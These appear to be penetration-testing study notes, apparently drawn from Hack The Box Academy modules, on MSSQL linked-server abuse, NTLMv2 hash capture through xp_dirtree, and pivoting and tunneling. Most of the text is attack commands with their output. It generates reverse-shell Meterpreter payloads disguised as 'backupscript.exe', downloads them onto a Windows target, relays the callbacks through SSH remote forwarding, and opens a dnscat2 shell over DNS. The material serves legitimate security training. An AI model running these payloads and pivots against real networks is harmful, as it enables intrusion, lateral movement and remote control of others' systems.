    > MSSQL has a configuration option called linked servers(https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
    > If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.
    > Identify linked Servers in MSSQL
        1> SELECT srvname, isremote FROM sysservers
        2> GO
        
        srvname                             isremote
        ----------------------------------- --------
        DESKTOP-MFERMN4\SQLEXPRESS          1
        10.0.0.12\SQLEXPRESS                0
        
        (2 rows affected)
    > As we can see in the query's output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server. We can see sysservers Transact-SQL(https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

    > Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE(https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
    > Identify linked Servers in MSSQL
        1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
        2> GO
        
        ------------------------------ ------------------------------ ------------------------------ -----------
        DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
        
        (1 rows affected)
        
        ! Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

    > As we have seen, we can now execute queries with sysadmin privileges on the linked server. As sysadmin, we control the SQL Server instance. We can read data from any database or execute system commands with xp_cmdshell. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as PostGreSQL, SQLite, Oracle, Firebase, and MongoDB which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.


* Latest SQL vulnerabilities
    > This time let's discuss a vulnerability that does not have a CVE and does not require a direct exploit. The previous section shows that we can get the NTLMv2 hashes by interacting with the MSSQL server. However, we should mention again that this attack is possible through a direct connection to the MSSQL server and vulnerable web applications. However, we will only focus on the simpler variant for the time being, namely the direct interaction.
    + The Concept of the Attack
        - We will focus on the undocumented MSSQL server function called xp_dirtree for this vulnerability. This function is used to view the contents of a specific folder (local or remote). Furthermore, this function provides some additional parameters that can be specified. These include the depth, how far the function should go in the folder, and the actual target folder.
        - The interesting thing is that the MSSQL function xp_dirtree is not directly a vulnerability but takes advantage of the authentication mechanism of SMB. When we try to access a shared folder on the network with a Windows host, this Windows host automatically sends an NTLMv2 hash for authentication.
        - This hash can be used in various ways against the MSSQL server and other hosts in the corporate network. This includes an SMB Relay attack where we "replay" the hash to log into other systems where the account has local admin privileges or cracking this hash on our local system. Successful cracking would allow us to see and use the password in cleartext. A successful SMB Relay attack would grant us admin rights on another host in the network, but not necessarily the host where the hash originated because Microsoft patched an older flaw that allowed an SMB Relay back to the originating host. We could, however, possibly gain local admin to another host and then steal credentials that could be re-used to gain local admin access to the original system where the NTLMv2 hash originated from.


-=-=-=-=
[+] Pivoting, tunneling and port forwarding

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `ifconfig`                                                     | Linux-based command that displays all current network configurations of a system. |
| `ipconfig`                                                     | Windows-based command that displays all system network configurations. |
| `netstat -r`                                                   | Command used to display the routing table for all IPv4-based protocols. |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                       | Nmap command used to scan a target for open ports allowing SSH or MySQL connections. |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`        | SSH comand used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306. |
| `netstat -antp \| grep 1234`                                   | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` . |
| `nmap -v -sV -p1234 localhost`                                 | Nmap command used to scan a host through a connection that has been made on local port `1234`. |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>` | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`. |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                       | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. |
| `tail -4 /etc/proxychains.conf`                                | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place. |
| `proxychains nmap -v -sn 172.16.5.1-200`                       | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`). |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                      | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`). |
| `proxychains msfconsole`                                       | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy. |
| `msf6 > search rdp_scanner`                                    | Metasploit search that attempts to find a module called `rdp_scanner`. |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123` | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy. |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080` | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `lhost=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`. |
| `msf6 > use exploit/multi/handler`                             | Used to select the multi-handler exploit module in Metasploit. |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`           | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`). |
| `python3 -m http.server 8123`                                  | Uses Python3 to start a simple HTTP server listening on port` 8123`. Can be used to retrieve files from a host. |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`. |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target. |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080` | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob. |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`  | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`). |
|                                                              |                                                              |
| `for i in {1...254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | For Loop used on a Windows-based system to discover devices in a specified network segment. |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. |
| `msf6 > use auxiliary/server/socks_proxy`                      | Metasploit command that selects the `socks_proxy` auxiliary module. |
| `msf6 auxiliary(server/socks_proxy) > jobs`                    | Metasploit command that lists all currently running jobs.    |
| `socks4 	127.0.0.1 9050`                                    | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. |
| `Socks5 127.0.0.1 1080`                                        | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5  proxy is used in combination with proxychains on the specified IP address and port. |
| `msf6 > use post/multi/manage/autoroute`                       | Metasploit command used to select the autoroute module.      |
|                                                              |                                                              |
| `meterpreter > help portfwd`                                   | Meterpreter command used to display the features of the portfwd command. |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>` | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`             | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly. |
| `netstat -antp`                                                | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections.`-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>` | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host. |
| `meterpreter > bg`                                             | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`  | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`    | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                     | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle`                                | Uses apt-get to install the tool sshuttle.                   |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`          | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`). |
| `sudo git clone https://github.com/klsecservices/rpivot.git`   | Clones the rpivot project GitHub repository.                 |
| `sudo apt-get install python2.7`                               | Uses apt-get to install python2.7.                           |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`). |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                     | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target. |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port. |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`      | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server. |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows-based command that uses `netsh.exe` to configure a portproxy rule called ` v4tov4`  that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. |
| `netsh.exe interface portproxy show v4tov4`                    | Windows-based command used to view the configurations of a portproxy rule called v4tov4. |
| `git clone https://github.com/iagox86/dnscat2.git`             | Clones the `dnscat2` project GitHub repository.              |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled. |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clones the dnscat2-powershell project Github repository.     |
| `Import-Module dnscat2.ps1`                                    | PowerShell command used to import the dnscat2.ps1 tool.      |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd` | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`). |
| `dnscat2> ?`                                                   | Used to list dnscat2 options.                                |
| `dnscat2> window -i 1`                                         | Used to interact with an established dnscat2 session.        |
| `./chisel server -v -p 1234 --socks5`                          | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5. |
| `./chisel client -v 10.129.202.64:1234 socks`                  | Used to connect to a chisel server at the specified IP address & port using socks. |
| `git clone https://github.com/utoni/ptunnel-ng.git`            | Clones the ptunnel-ng project GitHub repository.             |
| `sudo ./autogen.sh`                                            | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files. |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                       | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`). |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`). |
| `ssh -p2222 -lubuntu 127.0.0.1`                                | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                         | Windows-based command used to register the SocksOverRDP-PLugin.dll. |
| `netstat -antb \|findstr 1080`                                 | Windows-based command used to list TCP network connections listening on port 1080. |



[+] Dynamic Port Forwarding with SSH and SOCKS Tunneling
* Port Forwarding in Context
    > Port forwarding is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer ==> https://en.wikipedia.org/wiki/SOCKS) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.
* SSH Local Port Forwarding (With an example)
https://academy.hackthebox.com/storage/modules/158/11.png
    > We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.
    > Scanning the Pivot Target
        m1l0js@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64
        Nmap scan report for 10.129.202.64
        Host is up (0.12s latency).
        
        PORT     STATE  SERVICE
        22/tcp   open   ssh
        3306/tcp closed mysql
        
        Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds

    > The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
    > Executing the Local Port Forward
        m1l0js@htb[/htb]$ ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
    > The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.
    > Confirming Port Forward with Netstat
        m1l0js@htb[/htb]$ netstat -antp | grep 1234
        (Not all processes could be identified, non-owned process info
         will not be shown, you would have to be root to see it all.)
        tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
        tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh   

    > Confirming Port Forward with Nmap
        m1l0js@htb[/htb]$ nmap -v -sV -p1234 localhost
        PORT     STATE SERVICE VERSION
        1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
    > Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.
    > Confirming Port Forward with Nmap
        m1l0js@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
[+] Setting up to Pivot
    > Now, if you type ifconfig on the Ubuntu host, you will find that this server has multiple NICs:
        + One connected to our attack host (ens192)
        + One communicating to other hosts within a different network (ens224)
        + The loopback interface (lo).
    > Looking for Opportunities to Pivot using ifconfig
        - Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.
        - This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.
        - This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.

        (https://academy.hackthebox.com/storage/modules/158/22.png)

        - In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on localhost:9050. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.
        - Enabling Dynamic Port Forwarding with SSH
            m1l0js@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64

        - The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

        - To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.
        - Checking /etc/proxychains.conf
            m1l0js@htb[/htb]$ tail -4 /etc/proxychains.conf
            # meanwile
            # defaults set to "tor"
            socks4 	127.0.0.1 9050

        - Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
        - Using Nmap with Proxychains
            m1l0js@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
            
            ProxyChains-3.1 (http://proxychains.sf.net)
            
            Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
            Initiating Ping Scan at 12:30
            Scanning 10 hosts [2 ports/host]
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
            RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
            
            <SNIP>

        - This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.
        - A full TCP connect scan without ping on an entire network range will take a long time. So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at 172.16.5.19.
        - We will perform a remote system scan using the below command.
        - Enumerating the Windows Target through Proxychains
            m1l0js@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19
            
            ProxyChains-3.1 (http://proxychains.sf.net)
            Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
            Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
            Initiating Parallel DNS resolution of 1 host. at 12:33
            Completed Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed
            Initiating Connect Scan at 12:33
            Scanning 172.16.5.19 [1000 ports]
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
            Discovered open port 445/tcp on 172.16.5.19
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8080-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:23-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:135-<><>-OK
            Discovered open port 135/tcp on 172.16.5.19
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:110-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:21-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:554-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-1172.16.5.19:25-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:5900-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1025-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:143-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:199-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:993-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:995-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
            Discovered open port 3389/tcp on 172.16.5.19
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:443-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:113-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8888-<--timeout
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:139-<><>-OK
            Discovered open port 139/tcp on 172.16.5.19

        - The Nmap scan shows several open ports, one of which is RDP port (3389). Similar to the Nmap scan, we can also pivot msfconsole via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.
        - Using Metasploit with Proxychains
        - We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
        - Enumerating the Windows Target through Proxychains
            m1l0js@htb[/htb]$ proxychains msfconsole
            msf6 > 
        - Let's use the rdp_scanner auxiliary module to check if the host on the internal network is listening on 3389.
        - Using rdp_scanner Module
            msf6 > search rdp_scanner
            
            Matching Modules
            ================
            
               #  Name                               Disclosure Date  Rank    Check  Description
               -  ----                               ---------------  ----    -----  -----------
               0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
            
            
        - Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner
            
            msf6 > use 0
            msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
            rhosts => 172.16.5.19
            msf6 auxiliary(scanner/rdp/rdp_scanner) > run
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
            |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
            
            [*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
            [*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
            [*] Auxiliary module execution completed
            
        - At the bottom of the output above, we can see the RDP port open with the Windows OS version.

        - Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. The user in our case is victor, and the password is pass@123
        - Using xfreerdp with Proxychains
            ProxyChains-3.1 (http://proxychains.sf.net)
            [13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
            [13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
            [13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
            [13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
            
        - The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.


[+] Remote/Reverse port forwarding with SSH
    > We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host Windows A. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

https://academy.hackthebox.com/storage/modules/158/33.png

    > But what happens if we try to gain a reverse shell?
    > The outgoing connection for the Windows host is only limited to the 172.16.5.0/23 network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).
    > There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to upload/download files (when the RDP clipboard is disabled), use exploits or low-level Windows API using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in Windows executables(https://lolbas-project.github.io/).
    > In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.
    > Creating a Windows Payload with msfvenom
        m1l0js@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
    > Configuring & Starting the multi/handler
        msf6 > use exploit/multi/handler
        
        [*] Using configured payload generic/shell_reverse_tcp
        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
        payload => windows/x64/meterpreter/reverse_https
        msf6 exploit(multi/handler) > set lhost 0.0.0.0
        lhost => 0.0.0.0
        msf6 exploit(multi/handler) > set lport 8000
        lport => 8000
        msf6 exploit(multi/handler) > run
        
        [*] Started HTTPS reverse handler on https://0.0.0.0:8000
    > Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.
    > Transferring Payload to Pivot Host
        m1l0js@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
    > After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.
    > Starting Python3 Webserver on Pivot Host
        ubuntu@Webserver$ python3 -m http.server 8123
    > Downloading Payload from Windows Target
    > We can download this backupscript.exe from the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
    > Downloading Payload from Windows Target
        PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
    > Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.
    > Using SSH -R
        m1l0js@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
    > After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
    > Viewing the Logs from the Pivot
        ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
        debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
        debug1: channel 1: new [172.16.5.19]
        debug1: confirm forwarded-tcpip
        debug1: channel 0: free: 172.16.5.19, nchannels 2
        debug1: channel 1: connected to 0.0.0.0 port 8000
        debug1: channel 1: free: 172.16.5.19, nchannels 1
        debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
        debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
        debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
        debug1: channel 0: new [172.16.5.19]
        debug1: confirm forwarded-tcpip
        debug1: channel 0: connected to 0.0.0.0 port 8000

